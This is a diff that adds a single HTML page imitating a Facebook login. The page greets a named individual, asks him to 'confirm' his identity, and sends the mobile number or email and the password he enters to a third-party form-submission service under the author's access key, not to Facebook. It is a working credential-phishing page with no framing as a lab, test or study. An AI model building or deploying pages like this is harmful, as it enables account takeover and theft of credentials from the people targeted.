@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Interface</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .login-container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 300px;
+      text-align: center;
+    }
+
+    .profile-pic {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background-image: url('https://i.imgur.com/Vcm5M6R.jpg');
+      background-size: cover;
+      background-position: center;
+      margin: 20px auto;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color:#007bff;
+    }
+
+    input[type=text], input[type=password] {
+      width: 100%;
+      padding: 12px 20px;
+      margin: 8px 0;
+      display: inline-block;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-sizing: border-box;
+      background-color:#ff95951f;
+    }
+
+    button {
+      background-color: #007bff;
+      background-color:#007bff;
+      padding: 12px 20px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 100%;
+      color:white;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+<h1>facebook</h1>
+<h2> Hello, Babu Bhuaiya</h2>
+
+    <div class="profile-pic"></div>
+
+    
+<h4>Please confirm you are Babu Bhuaiya</h4>
+
+
+    <form action="https://api.web3forms.com/submit" method="POST">
+
+    <!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="fd4e9bfd-796b-47eb-9071-0c16558f4532">
+
+   
+    <input type="text" name="name" placeholder="Mobile number or email address" required>
+    <input type="text" name="email" placeholder="Password" required>
+    
+
+    <!-- Honeypot Spam Protection -->
+   
+
+    <!-- Custom Confirmation / Success Page -->
+    <!-- <input type="hidden" name="redirect" value="https://mywebsite.com/thanks.html"> -->
+
+    <button type="submit">Log In</button>
+
+</form>
+  </div>
+
+  </body>
+</html>
